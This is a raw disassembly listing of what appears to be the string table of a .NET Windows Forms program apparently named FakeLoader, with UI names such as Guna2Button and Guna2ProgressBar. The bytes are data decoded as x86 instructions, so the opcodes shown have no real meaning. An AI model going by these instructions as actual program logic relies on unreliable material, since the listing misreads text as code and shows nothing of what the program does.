  405340:	72 61                	jb     0x4053a3
  405342:	67 00 73 65          	add    %dh,0x65(%bp,%di)
  405346:	74 5f                	je     0x4053a7
  405348:	55                   	push   %ebp
  405349:	73 65                	jae    0x4053b0
  40534b:	54                   	push   %esp
  40534c:	72 61                	jb     0x4053af
  40534e:	6e                   	outsb  %ds:(%esi),(%dx)
  40534f:	73 70                	jae    0x4053c1
  405351:	61                   	popa
  405352:	72 65                	jb     0x4053b9
  405354:	6e                   	outsb  %ds:(%esi),(%dx)
  405355:	74 44                	je     0x40539b
  405357:	72 61                	jb     0x4053ba
  405359:	67 00 53 79          	add    %dl,0x79(%bp,%di)
  40535d:	73 74                	jae    0x4053d3
  40535f:	65 6d                	gs insl (%dx),%es:(%edi)
  405361:	2e 52                	cs push %edx
  405363:	75 6e                	jne    0x4053d3
  405365:	74 69                	je     0x4053d0
  405367:	6d                   	insl   (%dx),%es:(%edi)
  405368:	65 2e 56             	gs cs push %esi
  40536b:	65 72 73             	gs jb  0x4053e1
  40536e:	69 6f 6e 69 6e 67 00 	imul   $0x676e69,0x6e(%edi),%ebp
  405375:	64 69 73 70 6f 73 69 	imul   $0x6e69736f,%fs:0x70(%ebx),%esi
  40537c:	6e 
  40537d:	67 00 53 79          	add    %dl,0x79(%bp,%di)
  405381:	73 74                	jae    0x4053f7
  405383:	65 6d                	gs insl (%dx),%es:(%edi)
  405385:	2e 44                	cs inc %esp
  405387:	72 61                	jb     0x4053ea
  405389:	77 69                	ja     0x4053f4
  40538b:	6e                   	outsb  %ds:(%esi),(%dx)
  40538c:	67 00 50 61          	add    %dl,0x61(%bx,%si)
  405390:	74 68                	je     0x4053fa
  405392:	00 67 65             	add    %ah,0x65(%edi)
  405395:	74 5f                	je     0x4053f6
  405397:	57                   	push   %edi
  405398:	69 64 74 68 00 67 65 	imul   $0x74656700,0x68(%esp,%esi,2),%esp
  40539f:	74 
  4053a0:	5f                   	pop    %edi
  4053a1:	42                   	inc    %edx
  4053a2:	6c                   	insb   (%dx),%es:(%edi)
  4053a3:	61                   	popa
  4053a4:	63 6b 00             	arpl   %ebp,0x0(%ebx)
  4053a7:	67 75 6e             	addr16 jne 0x405418
  4053aa:	61                   	popa
  4053ab:	32 42 75             	xor    0x75(%edx),%al
  4053ae:	74 74                	je     0x405424
  4053b0:	6f                   	outsl  %ds:(%esi),(%dx)
  4053b1:	6e                   	outsb  %ds:(%esi),(%dx)
  4053b2:	31 5f 43             	xor    %ebx,0x43(%edi)
  4053b5:	6c                   	insb   (%dx),%es:(%edi)
  4053b6:	69 63 6b 00 67 75 6e 	imul   $0x6e756700,0x6b(%ebx),%esp
  4053bd:	61                   	popa
  4053be:	32 42 75             	xor    0x75(%edx),%al
  4053c1:	74 74                	je     0x405437
  4053c3:	6f                   	outsl  %ds:(%esi),(%dx)
  4053c4:	6e                   	outsb  %ds:(%esi),(%dx)
  4053c5:	32 5f 43             	xor    0x43(%edi),%bl
  4053c8:	6c                   	insb   (%dx),%es:(%edi)
  4053c9:	69 63 6b 00 61 64 64 	imul   $0x64646100,0x6b(%ebx),%esp
  4053d0:	5f                   	pop    %edi
  4053d1:	43                   	inc    %ebx
  4053d2:	6c                   	insb   (%dx),%es:(%edi)
  4053d3:	69 63 6b 00 73 65 74 	imul   $0x74657300,0x6b(%ebx),%esp
  4053da:	5f                   	pop    %edi
  4053db:	44                   	inc    %esp
  4053dc:	6f                   	outsl  %ds:(%esi),(%dx)
  4053dd:	63 6b 00             	arpl   %ebp,0x0(%ebx)
  4053e0:	67 65 74 5f          	addr16 gs je 0x405443
  4053e4:	54                   	push   %esp
  4053e5:	61                   	popa
  4053e6:	73 6b                	jae    0x405453
  4053e8:	00 47 75             	add    %al,0x75(%edi)
  4053eb:	6e                   	outsb  %ds:(%esi),(%dx)
  4053ec:	61                   	popa
  4053ed:	32 48 74             	xor    0x74(%eax),%cl
  4053f0:	6d                   	insl   (%dx),%es:(%edi)
  4053f1:	6c                   	insb   (%dx),%es:(%edi)
  4053f2:	4c                   	dec    %esp
  4053f3:	61                   	popa
  4053f4:	62 65 6c             	bound  %esp,0x6c(%ebp)
  4053f7:	00 53 79             	add    %dl,0x79(%ebx)
  4053fa:	73 74                	jae    0x405470
  4053fc:	65 6d                	gs insl (%dx),%es:(%edi)
  4053fe:	2e 43                	cs inc %ebx
  405400:	6f                   	outsl  %ds:(%esi),(%dx)
  405401:	6d                   	insl   (%dx),%es:(%edi)
  405402:	70 6f                	jo     0x405473
  405404:	6e                   	outsb  %ds:(%esi),(%dx)
  405405:	65 6e                	outsb  %gs:(%esi),(%dx)
  405407:	74 4d                	je     0x405456
  405409:	6f                   	outsl  %ds:(%esi),(%dx)
  40540a:	64 65 6c             	fs gs insb (%dx),%es:(%edi)
  40540d:	00 47 75             	add    %al,0x75(%edi)
  405410:	6e                   	outsb  %ds:(%esi),(%dx)
  405411:	61                   	popa
  405412:	32 50 61             	xor    0x61(%eax),%dl
  405415:	6e                   	outsb  %ds:(%esi),(%dx)
  405416:	65 6c                	gs insb (%dx),%es:(%edi)
  405418:	00 47 65             	add    %al,0x65(%edi)
  40541b:	74 50                	je     0x40546d
  40541d:	69 78 65 6c 00 47 75 	imul   $0x7547006c,0x65(%eax),%edi
  405424:	6e                   	outsb  %ds:(%esi),(%dx)
  405425:	61                   	popa
  405426:	32 44 72 61          	xor    0x61(%edx,%esi,2),%al
  40542a:	67 43                	addr16 inc %ebx
  40542c:	6f                   	outsl  %ds:(%esi),(%dx)
  40542d:	6e                   	outsb  %ds:(%esi),(%dx)
  40542e:	74 72                	je     0x4054a2
  405430:	6f                   	outsl  %ds:(%esi),(%dx)
  405431:	6c                   	insb   (%dx),%es:(%edi)
  405432:	00 73 65             	add    %dh,0x65(%ebx)
  405435:	74 5f                	je     0x405496
  405437:	43                   	inc    %ebx
  405438:	6f                   	outsl  %ds:(%esi),(%dx)
  405439:	6e                   	outsb  %ds:(%esi),(%dx)
  40543a:	74 61                	je     0x40549d
  40543c:	69 6e 65 72 43 6f 6e 	imul   $0x6e6f4372,0x65(%esi),%ebp
  405443:	74 72                	je     0x4054b7
  405445:	6f                   	outsl  %ds:(%esi),(%dx)
  405446:	6c                   	insb   (%dx),%es:(%edi)
  405447:	00 73 65             	add    %dh,0x65(%ebx)
  40544a:	74 5f                	je     0x4054ab
  40544c:	54                   	push   %esp
  40544d:	61                   	popa
  40544e:	72 67                	jb     0x4054b7
  405450:	65 74 43             	gs je  0x405496
  405453:	6f                   	outsl  %ds:(%esi),(%dx)
  405454:	6e                   	outsb  %ds:(%esi),(%dx)
  405455:	74 72                	je     0x4054c9
  405457:	6f                   	outsl  %ds:(%esi),(%dx)
  405458:	6c                   	insb   (%dx),%es:(%edi)
  405459:	00 4d 65             	add    %cl,0x65(%ebp)
  40545c:	6d                   	insl   (%dx),%es:(%edi)
  40545d:	6f                   	outsl  %ds:(%esi),(%dx)
  40545e:	72 79                	jb     0x4054d9
  405460:	53                   	push   %ebx
  405461:	74 72                	je     0x4054d5
  405463:	65 61                	gs popa
  405465:	6d                   	insl   (%dx),%es:(%edi)
  405466:	00 50 72             	add    %dl,0x72(%eax)
  405469:	6f                   	outsl  %ds:(%esi),(%dx)
  40546a:	67 72 61             	addr16 jb 0x4054ce
  40546d:	6d                   	insl   (%dx),%es:(%edi)
  40546e:	00 53 79             	add    %dl,0x79(%ebx)
  405471:	73 74                	jae    0x4054e7
  405473:	65 6d                	gs insl (%dx),%es:(%edi)
  405475:	00 47 75             	add    %al,0x75(%edi)
  405478:	6e                   	outsb  %ds:(%esi),(%dx)
  405479:	61                   	popa
  40547a:	32 42 6f             	xor    0x6f(%edx),%al
  40547d:	72 64                	jb     0x4054e3
  40547f:	65 72 6c             	gs jb  0x4054ee
  405482:	65 73 73             	gs jae 0x4054f8
  405485:	46                   	inc    %esi
  405486:	6f                   	outsl  %ds:(%esi),(%dx)
  405487:	72 6d                	jb     0x4054f6
  405489:	00 73 75             	add    %dh,0x75(%ebx)
  40548c:	6d                   	insl   (%dx),%es:(%edi)
  40548d:	00 72 65             	add    %dh,0x65(%edx)
  405490:	73 6f                	jae    0x405501
  405492:	75 72                	jne    0x405506
  405494:	63 65 4d             	arpl   %esp,0x4d(%ebp)
  405497:	61                   	popa
  405498:	6e                   	outsb  %ds:(%esi),(%dx)
  405499:	00 4d 61             	add    %cl,0x61(%ebp)
  40549c:	69 6e 00 41 70 70 44 	imul   $0x44707041,0x0(%esi),%ebp
  4054a3:	6f                   	outsl  %ds:(%esi),(%dx)
  4054a4:	6d                   	insl   (%dx),%es:(%edi)
  4054a5:	61                   	popa
  4054a6:	69 6e 00 67 65 74 5f 	imul   $0x5f746567,0x0(%esi),%ebp
  4054ad:	43                   	inc    %ebx
  4054ae:	75 72                	jne    0x405522
  4054b0:	72 65                	jb     0x405517
  4054b2:	6e                   	outsb  %ds:(%esi),(%dx)
  4054b3:	74 44                	je     0x4054f9
  4054b5:	6f                   	outsl  %ds:(%esi),(%dx)
  4054b6:	6d                   	insl   (%dx),%es:(%edi)
  4054b7:	61                   	popa
  4054b8:	69 6e 00 73 65 74 5f 	imul   $0x5f746573,0x0(%esi),%ebp
  4054bf:	53                   	push   %ebx
  4054c0:	68 6f 77 49 63       	push   $0x6349776f
  4054c5:	6f                   	outsl  %ds:(%esi),(%dx)
  4054c6:	6e                   	outsb  %ds:(%esi),(%dx)
  4054c7:	00 4d 65             	add    %cl,0x65(%ebp)
  4054ca:	73 73                	jae    0x40553f
  4054cc:	61                   	popa
  4054cd:	67 65 42             	addr16 gs inc %edx
  4054d0:	6f                   	outsl  %ds:(%esi),(%dx)
  4054d1:	78 49                	js     0x40551c
  4054d3:	63 6f 6e             	arpl   %ebp,0x6e(%edi)
  4054d6:	00 69 63             	add    %ch,0x63(%ecx)
  4054d9:	6f                   	outsl  %ds:(%esi),(%dx)
  4054da:	6e                   	outsb  %ds:(%esi),(%dx)
  4054db:	00 41 70             	add    %al,0x70(%ecx)
  4054de:	70 6c                	jo     0x40554c
  4054e0:	69 63 61 74 69 6f 6e 	imul   $0x6e6f6974,0x61(%ebx),%esp
  4054e7:	00 73 65             	add    %dh,0x65(%ebx)
  4054ea:	74 5f                	je     0x40554b
  4054ec:	4c                   	dec    %esp
  4054ed:	6f                   	outsl  %ds:(%esi),(%dx)
  4054ee:	63 61 74             	arpl   %esp,0x74(%ecx)
  4054f1:	69 6f 6e 00 53 79 73 	imul   $0x73795300,0x6e(%edi),%ebp
  4054f8:	74 65                	je     0x40555f
  4054fa:	6d                   	insl   (%dx),%es:(%edi)
  4054fb:	2e 43                	cs inc %ebx
  4054fd:	6f                   	outsl  %ds:(%esi),(%dx)
  4054fe:	6e                   	outsb  %ds:(%esi),(%dx)
  4054ff:	66 69 67 75 72 61    	imul   $0x6172,0x75(%edi),%sp
  405505:	74 69                	je     0x405570
  405507:	6f                   	outsl  %ds:(%esi),(%dx)
  405508:	6e                   	outsb  %ds:(%esi),(%dx)
  405509:	00 53 79             	add    %dl,0x79(%ebx)
  40550c:	73 74                	jae    0x405582
  40550e:	65 6d                	gs insl (%dx),%es:(%edi)
  405510:	2e 47                	cs inc %edi
  405512:	6c                   	insb   (%dx),%es:(%edi)
  405513:	6f                   	outsl  %ds:(%esi),(%dx)
  405514:	62 61 6c             	bound  %esp,0x6c(%ecx)
  405517:	69 7a 61 74 69 6f 6e 	imul   $0x6e6f6974,0x61(%edx),%edi
  40551e:	00 41 63             	add    %al,0x63(%ecx)
  405521:	74 69                	je     0x40558c
  405523:	6f                   	outsl  %ds:(%esi),(%dx)
  405524:	6e                   	outsb  %ds:(%esi),(%dx)
  405525:	00 53 79             	add    %dl,0x79(%ebx)
  405528:	73 74                	jae    0x40559e
  40552a:	65 6d                	gs insl (%dx),%es:(%edi)
  40552c:	2e 52                	cs push %edx
  40552e:	65 66 6c             	gs data16 insb (%dx),%es:(%edi)
  405531:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  405536:	6e                   	outsb  %ds:(%esi),(%dx)
  405537:	00 43 6f             	add    %al,0x6f(%ebx)
  40553a:	6e                   	outsb  %ds:(%esi),(%dx)
  40553b:	74 72                	je     0x4055af
  40553d:	6f                   	outsl  %ds:(%esi),(%dx)
  40553e:	6c                   	insb   (%dx),%es:(%edi)
  40553f:	43                   	inc    %ebx
  405540:	6f                   	outsl  %ds:(%esi),(%dx)
  405541:	6c                   	insb   (%dx),%es:(%edi)
  405542:	6c                   	insb   (%dx),%es:(%edi)
  405543:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  405548:	6e                   	outsb  %ds:(%esi),(%dx)
  405549:	00 73 65             	add    %dh,0x65(%ebx)
  40554c:	74 5f                	je     0x4055ad
  40554e:	53                   	push   %ebx
  40554f:	74 61                	je     0x4055b2
  405551:	72 74                	jb     0x4055c7
  405553:	50                   	push   %eax
  405554:	6f                   	outsl  %ds:(%esi),(%dx)
  405555:	73 69                	jae    0x4055c0
  405557:	74 69                	je     0x4055c2
  405559:	6f                   	outsl  %ds:(%esi),(%dx)
  40555a:	6e                   	outsb  %ds:(%esi),(%dx)
  40555b:	00 46 6f             	add    %al,0x6f(%esi)
  40555e:	72 6d                	jb     0x4055cd
  405560:	53                   	push   %ebx
  405561:	74 61                	je     0x4055c4
  405563:	72 74                	jb     0x4055d9
  405565:	50                   	push   %eax
  405566:	6f                   	outsl  %ds:(%esi),(%dx)
  405567:	73 69                	jae    0x4055d2
  405569:	74 69                	je     0x4055d4
  40556b:	6f                   	outsl  %ds:(%esi),(%dx)
  40556c:	6e                   	outsb  %ds:(%esi),(%dx)
  40556d:	00 63 61             	add    %ah,0x61(%ebx)
  405570:	70 74                	jo     0x4055e6
  405572:	69 6f 6e 00 53 65 74 	imul   $0x74655300,0x6e(%edi),%ebp
  405579:	45                   	inc    %ebp
  40557a:	78 63                	js     0x4055df
  40557c:	65 70 74             	gs jo  0x4055f3
  40557f:	69 6f 6e 00 47 75 6e 	imul   $0x6e754700,0x6e(%edi),%ebp
  405586:	61                   	popa
  405587:	32 42 75             	xor    0x75(%edx),%al
  40558a:	74 74                	je     0x405600
  40558c:	6f                   	outsl  %ds:(%esi),(%dx)
  40558d:	6e                   	outsb  %ds:(%esi),(%dx)
  40558e:	00 52 75             	add    %dl,0x75(%edx)
  405591:	6e                   	outsb  %ds:(%esi),(%dx)
  405592:	00 4d 65             	add    %cl,0x65(%ebp)
  405595:	74 68                	je     0x4055ff
  405597:	6f                   	outsl  %ds:(%esi),(%dx)
  405598:	64 49                	fs dec %ecx
  40559a:	6e                   	outsb  %ds:(%esi),(%dx)
  40559b:	66 6f                	outsw  %ds:(%esi),(%dx)
  40559d:	00 43 75             	add    %al,0x75(%ebx)
  4055a0:	6c                   	insb   (%dx),%es:(%edi)
  4055a1:	74 75                	je     0x405618
  4055a3:	72 65                	jb     0x40560a
  4055a5:	49                   	dec    %ecx
  4055a6:	6e                   	outsb  %ds:(%esi),(%dx)
  4055a7:	66 6f                	outsw  %ds:(%esi),(%dx)
  4055a9:	00 42 69             	add    %al,0x69(%edx)
  4055ac:	74 6d                	je     0x40561b
  4055ae:	61                   	popa
  4055af:	70 00                	jo     0x4055b1
  4055b1:	47                   	inc    %edi
  4055b2:	75 6e                	jne    0x405622
  4055b4:	61                   	popa
  4055b5:	32 50 72             	xor    0x72(%eax),%dl
  4055b8:	6f                   	outsl  %ds:(%esi),(%dx)
  4055b9:	67 72 65             	addr16 jb 0x405621
  4055bc:	73 73                	jae    0x405631
  4055be:	42                   	inc    %edx
  4055bf:	61                   	popa
  4055c0:	72 00                	jb     0x4055c2
  4055c2:	46                   	inc    %esi
  4055c3:	61                   	popa
  4055c4:	6b 65 4c 6f          	imul   $0x6f,0x4c(%ebp),%esp
  4055c8:	61                   	popa
  4055c9:	64 65 72 00          	fs gs jb 0x4055cd
  4055cd:	41                   	inc    %ecx
  4055ce:	73 79                	jae    0x405649
  4055d0:	6e                   	outsb  %ds:(%esi),(%dx)
  4055d1:	63 56 6f             	arpl   %edx,0x6f(%esi)
  4055d4:	69 64 4d 65 74 68 6f 	imul   $0x646f6874,0x65(%ebp,%ecx,2),%esp
  4055db:	64 
  4055dc:	42                   	inc    %edx
  4055dd:	75 69                	jne    0x405648
  4055df:	6c                   	insb   (%dx),%es:(%edi)
  4055e0:	64 65 72 00          	fs gs jb 0x4055e4
  4055e4:	41                   	inc    %ecx
  4055e5:	73 79                	jae    0x405660
  4055e7:	6e                   	outsb  %ds:(%esi),(%dx)
  4055e8:	63 54 61 73          	arpl   %edx,0x73(%ecx,%eiz,2)
  4055ec:	6b 4d 65 74          	imul   $0x74,0x65(%ebp),%ecx
  4055f0:	68 6f 64 42 75       	push   $0x7542646f
  4055f5:	69 6c 64 65 72 00 3c 	imul   $0x3e3c0072,0x65(%esp,%eiz,2),%ebp
  4055fc:	3e 
  4055fd:	74 5f                	je     0x40565e
  4055ff:	5f                   	pop    %edi
  405600:	62 75 69             	bound  %esi,0x69(%ebp)
  405603:	6c                   	insb   (%dx),%es:(%edi)
  405604:	64 65 72 00          	fs gs jb 0x405608
  405608:	73 65                	jae    0x40566f
  40560a:	6e                   	outsb  %ds:(%esi),(%dx)
  40560b:	64 65 72 00          	fs gs jb 0x40560f
  40560f:	67 65 74 5f          	addr16 gs je 0x405672
  405613:	52                   	push   %edx
  405614:	65 73 6f             	gs jae 0x405686
  405617:	75 72                	jne    0x40568b
  405619:	63 65 4d             	arpl   %esp,0x4d(%ebp)
  40561c:	61                   	popa
  40561d:	6e                   	outsb  %ds:(%esi),(%dx)
  40561e:	61                   	popa
  40561f:	67 65 72 00          	addr16 gs jb 0x405623
  405623:	45                   	inc    %ebp
  405624:	76 65                	jbe    0x40568b
  405626:	6e                   	outsb  %ds:(%esi),(%dx)
  405627:	74 48                	je     0x405671
  405629:	61                   	popa
  40562a:	6e                   	outsb  %ds:(%esi),(%dx)
  40562b:	64 6c                	fs insb (%dx),%es:(%edi)
  40562d:	65 72 00             	gs jb  0x405630
  405630:	53                   	push   %ebx
  405631:	79 73                	jns    0x4056a6
  405633:	74 65                	je     0x40569a
  405635:	6d                   	insl   (%dx),%es:(%edi)
  405636:	2e 43                	cs inc %ebx
  405638:	6f                   	outsl  %ds:(%esi),(%dx)
  405639:	64 65 44             	fs gs inc %esp
  40563c:	6f                   	outsl  %ds:(%esi),(%dx)
  40563d:	6d                   	insl   (%dx),%es:(%edi)
  40563e:	2e 43                	cs inc %ebx
  405640:	6f                   	outsl  %ds:(%esi),(%dx)
  405641:	6d                   	insl   (%dx),%es:(%edi)
  405642:	70 69                	jo     0x4056ad
  405644:	6c                   	insb   (%dx),%es:(%edi)
  405645:	65 72 00             	gs jb  0x405648
  405648:	49                   	dec    %ecx
  405649:	43                   	inc    %ebx
  40564a:	6f                   	outsl  %ds:(%esi),(%dx)
  40564b:	6e                   	outsb  %ds:(%esi),(%dx)
  40564c:	74 61                	je     0x4056af
  40564e:	69 6e 65 72 00 54 61 	imul   $0x61540072,0x65(%esi),%ebp
  405655:	73 6b                	jae    0x4056c2
  405657:	41                   	inc    %ecx
  405658:	77 61                	ja     0x4056bb
  40565a:	69 74 65 72 00 47 65 	imul   $0x74654700,0x72(%ebp,%eiz,2),%esi
  405661:	74 
  405662:	41                   	inc    %ecx
  405663:	77 61                	ja     0x4056c6
  405665:	69 74 65 72 00 73 65 	imul   $0x74657300,0x72(%ebp,%eiz,2),%esi
  40566c:	74 
  40566d:	5f                   	pop    %edi
  40566e:	41                   	inc    %ecx
  40566f:	6e                   	outsb  %ds:(%esi),(%dx)
  405670:	63 68 6f             	arpl   %ebp,0x6f(%eax)
  405673:	72 00                	jb     0x405675
  405675:	73 65                	jae    0x4056dc
  405677:	74 5f                	je     0x4056d8
  405679:	46                   	inc    %esi
  40567a:	6f                   	outsl  %ds:(%esi),(%dx)
  40567b:	72 65                	jb     0x4056e2
  40567d:	43                   	inc    %ebx
  40567e:	6f                   	outsl  %ds:(%esi),(%dx)
  40567f:	6c                   	insb   (%dx),%es:(%edi)
  405680:	6f                   	outsl  %ds:(%esi),(%dx)
  405681:	72 00                	jb     0x405683
  405683:	73 65                	jae    0x4056ea
  405685:	74 5f                	je     0x4056e6
  405687:	42                   	inc    %edx
  405688:	61                   	popa
  405689:	63 6b 43             	arpl   %ebp,0x43(%ebx)
  40568c:	6f                   	outsl  %ds:(%esi),(%dx)
  40568d:	6c                   	insb   (%dx),%es:(%edi)
  40568e:	6f                   	outsl  %ds:(%esi),(%dx)
  40568f:	72 00                	jb     0x405691
  405691:	73 65                	jae    0x4056f8
  405693:	74 5f                	je     0x4056f4
  405695:	46                   	inc    %esi
  405696:	69 6c 6c 43 6f 6c 6f 	imul   $0x726f6c6f,0x43(%esp,%ebp,2),%ebp
  40569d:	72 
  40569e:	00 73 65             	add    %dh,0x65(%ebx)
  4056a1:	74 5f                	je     0x405702
  4056a3:	49                   	dec    %ecx
  4056a4:	63 6f 6e             	arpl   %ebp,0x6e(%edi)
  4056a7:	43                   	inc    %ebx
  4056a8:	6f                   	outsl  %ds:(%esi),(%dx)
  4056a9:	6c                   	insb   (%dx),%es:(%edi)
  4056aa:	6f                   	outsl  %ds:(%esi),(%dx)
  4056ab:	72 00                	jb     0x4056ad
  4056ad:	73 65                	jae    0x405714
  4056af:	74 5f                	je     0x405710
  4056b1:	42                   	inc    %edx
  4056b2:	6f                   	outsl  %ds:(%esi),(%dx)
  4056b3:	72 64                	jb     0x405719
  4056b5:	65 72 43             	gs jb  0x4056fb
  4056b8:	6f                   	outsl  %ds:(%esi),(%dx)
  4056b9:	6c                   	insb   (%dx),%es:(%edi)
  4056ba:	6f                   	outsl  %ds:(%esi),(%dx)
  4056bb:	72 00                	jb     0x4056bd
  4056bd:	47                   	inc    %edi
  4056be:	75 6e                	jne    0x40572e
  4056c0:	61                   	popa
  4056c1:	32 53 65             	xor    0x65(%ebx),%dl
  4056c4:	70 61                	jo     0x405727
  4056c6:	72 61                	jb     0x405729
  4056c8:	74 6f                	je     0x405739
  4056ca:	72 00                	jb     0x4056cc
  4056cc:	2e 63 74 6f 72       	arpl   %esi,%cs:0x72(%edi,%ebp,2)
  4056d1:	00 2e                	add    %ch,(%esi)
  4056d3:	63 63 74             	arpl   %esp,0x74(%ebx)
  4056d6:	6f                   	outsl  %ds:(%esi),(%dx)
  4056d7:	72 00                	jb     0x4056d9
  4056d9:	53                   	push   %ebx
  4056da:	79 73                	jns    0x40574f
  4056dc:	74 65                	je     0x405743
  4056de:	6d                   	insl   (%dx),%es:(%edi)
  4056df:	2e 44                	cs inc %esp
  4056e1:	69 61 67 6e 6f 73 74 	imul   $0x74736f6e,0x67(%ecx),%esp
  4056e8:	69 63 73 00 53 79 73 	imul   $0x73795300,0x73(%ebx),%esp
  4056ef:	74 65                	je     0x405756
  4056f1:	6d                   	insl   (%dx),%es:(%edi)
  4056f2:	2e 52                	cs push %edx
  4056f4:	75 6e                	jne    0x405764
  4056f6:	74 69                	je     0x405761
  4056f8:	6d                   	insl   (%dx),%es:(%edi)
  4056f9:	65 2e 49             	gs cs dec %ecx
  4056fc:	6e                   	outsb  %ds:(%esi),(%dx)
  4056fd:	74 65                	je     0x405764
  4056ff:	72 6f                	jb     0x405770
  405701:	70 53                	jo     0x405756
  405703:	65 72 76             	gs jb  0x40577c
  405706:	69 63 65 73 00 53 79 	imul   $0x79530073,0x65(%ebx),%esp
  40570d:	73 74                	jae    0x405783
  40570f:	65 6d                	gs insl (%dx),%es:(%edi)
  405711:	2e 52                	cs push %edx
  405713:	75 6e                	jne    0x405783
  405715:	74 69                	je     0x405780
  405717:	6d                   	insl   (%dx),%es:(%edi)
  405718:	65 2e 43             	gs cs inc %ebx
  40571b:	6f                   	outsl  %ds:(%esi),(%dx)
  40571c:	6d                   	insl   (%dx),%es:(%edi)
  40571d:	70 69                	jo     0x405788
  40571f:	6c                   	insb   (%dx),%es:(%edi)
  405720:	65 72 53             	gs jb  0x405776
  405723:	65 72 76             	gs jb  0x40579c
  405726:	69 63 65 73 00 53 79 	imul   $0x79530073,0x65(%ebx),%esp
  40572d:	73 74                	jae    0x4057a3
  40572f:	65 6d                	gs insl (%dx),%es:(%edi)
  405731:	2e 52                	cs push %edx
  405733:	65 73 6f             	gs jae 0x4057a5
  405736:	75 72                	jne    0x4057aa
  405738:	63 65 73             	arpl   %esp,0x73(%ebp)
  40573b:	00 46 61             	add    %al,0x61(%esi)
  40573e:	6b 65 4c 6f          	imul   $0x6f,0x4c(%ebp),%esp
  405742:	61                   	popa
  405743:	64 65 72 2e          	fs gs jb 0x405775
  405747:	46                   	inc    %esi
  405748:	6f                   	outsl  %ds:(%esi),(%dx)
  405749:	72 6d                	jb     0x4057b8
  40574b:	31 2e                	xor    %ebp,(%esi)
  40574d:	72 65                	jb     0x4057b4
  40574f:	73 6f                	jae    0x4057c0
  405751:	75 72                	jne    0x4057c5
  405753:	63 65 73             	arpl   %esp,0x73(%ebp)
  405756:	00 57 69             	add    %dl,0x69(%edi)
  405759:	6e                   	outsb  %ds:(%esi),(%dx)
  40575a:	64 6f                	outsl  %fs:(%esi),(%dx)
  40575c:	77 73                	ja     0x4057d1
  40575e:	46                   	inc    %esi
  40575f:	6f                   	outsl  %ds:(%esi),(%dx)
  405760:	72 6d                	jb     0x4057cf
  405762:	73 41                	jae    0x4057a5
  405764:	70 70                	jo     0x4057d6
  405766:	31 2e                	xor    %ebp,(%esi)
  405768:	50                   	push   %eax
  405769:	72 6f                	jb     0x4057da
  40576b:	70 65                	jo     0x4057d2
  40576d:	72 74                	jb     0x4057e3
  40576f:	69 65 73 2e 52 65 73 	imul   $0x7365522e,0x73(%ebp),%esp
  405776:	6f                   	outsl  %ds:(%esi),(%dx)
  405777:	75 72                	jne    0x4057eb
  405779:	63 65 73             	arpl   %esp,0x73(%ebp)
  40577c:	2e 72 65             	jb,pn  0x4057e4
  40577f:	73 6f                	jae    0x4057f0
  405781:	75 72                	jne    0x4057f5
  405783:	63 65 73             	arpl   %esp,0x73(%ebp)
  405786:	00 44 65 62          	add    %al,0x62(%ebp,%eiz,2)
  40578a:	75 67                	jne    0x4057f3
  40578c:	67 69 6e 67 4d 6f 64 	imul   $0x65646f4d,0x67(%bp),%ebp
  405793:	65 
  405794:	73 00                	jae    0x405796
  405796:	57                   	push   %edi
  405797:	69 6e 64 6f 77 73 46 	imul   $0x4673776f,0x64(%esi),%ebp
  40579e:	6f                   	outsl  %ds:(%esi),(%dx)
  40579f:	72 6d                	jb     0x40580e
  4057a1:	73 41                	jae    0x4057e4
  4057a3:	70 70                	jo     0x405815
  4057a5:	31 2e                	xor    %ebp,(%esi)
  4057a7:	50                   	push   %eax
  4057a8:	72 6f                	jb     0x405819
  4057aa:	70 65                	jo     0x405811
  4057ac:	72 74                	jb     0x405822
  4057ae:	69 65 73 00 45 6e 61 	imul   $0x616e4500,0x73(%ebp),%esp
  4057b5:	62 6c 65 56          	bound  %ebp,0x56(%ebp,%eiz,2)
  4057b9:	69 73 75 61 6c 53 74 	imul   $0x74536c61,0x75(%ebx),%esi
  4057c0:	79 6c                	jns    0x40582e
  4057c2:	65 73 00             	gs jae 0x4057c5
  4057c5:	41                   	inc    %ecx
  4057c6:	6e                   	outsb  %ds:(%esi),(%dx)
  4057c7:	63 68 6f             	arpl   %ebp,0x6f(%eax)
  4057ca:	72 53                	jb     0x40581f
  4057cc:	74 79                	je     0x405847
  4057ce:	6c                   	insb   (%dx),%es:(%edi)
  4057cf:	65 73 00             	gs jae 0x4057d2
  4057d2:	47                   	inc    %edi
  4057d3:	65 74 54             	gs je  0x40582a
  4057d6:	79 70                	jns    0x405848
  4057d8:	65 73 00             	gs jae 0x4057db
  4057db:	42                   	inc    %edx
  4057dc:	69 6e 64 69 6e 67 46 	imul   $0x46676e69,0x64(%esi),%ebp
  4057e3:	6c                   	insb   (%dx),%es:(%edi)
  4057e4:	61                   	popa
  4057e5:	67 73 00             	addr16 jae 0x4057e8
  4057e8:	53                   	push   %ebx
  4057e9:	65 74 74             	gs je  0x405860
  4057ec:	69 6e 67 73 00 45 76 	imul   $0x76450073,0x67(%esi),%ebp
  4057f3:	65 6e                	outsb  %gs:(%esi),(%dx)
  4057f5:	74 41                	je     0x405838
  4057f7:	72 67                	jb     0x405860
  4057f9:	73 00                	jae    0x4057fb
  4057fb:	3c 3e                	cmp    $0x3e,%al
  4057fd:	34 5f                	xor    $0x5f,%al
  4057ff:	5f                   	pop    %edi
  405800:	74 68                	je     0x40586a
  405802:	69 73 00 53 79 73 74 	imul   $0x74737953,0x0(%ebx),%esi
  405809:	65 6d                	gs insl (%dx),%es:(%edi)
  40580b:	2e 54                	cs push %esp
  40580d:	68 72 65 61 64       	push   $0x64616572
  405812:	69 6e 67 2e 54 61 73 	imul   $0x7361542e,0x67(%esi),%ebp
  405819:	6b 73 00 67          	imul   $0x67,0x0(%ebx),%esi
  40581d:	65 74 5f             	gs je  0x40587f
  405820:	43                   	inc    %ebx
  405821:	6f                   	outsl  %ds:(%esi),(%dx)
  405822:	6e                   	outsb  %ds:(%esi),(%dx)
  405823:	74 72                	je     0x405897
  405825:	6f                   	outsl  %ds:(%esi),(%dx)
  405826:	6c                   	insb   (%dx),%es:(%edi)
  405827:	73 00                	jae    0x405829
  405829:	53                   	push   %ebx
  40582a:	79 73                	jns    0x40589f
  40582c:	74 65                	je     0x405893
  40582e:	6d                   	insl   (%dx),%es:(%edi)
  40582f:	2e 57                	cs push %edi
  405831:	69 6e 64 6f 77 73 2e 	imul   $0x2e73776f,0x64(%esi),%ebp
  405838:	46                   	inc    %esi
  405839:	6f                   	outsl  %ds:(%esi),(%dx)
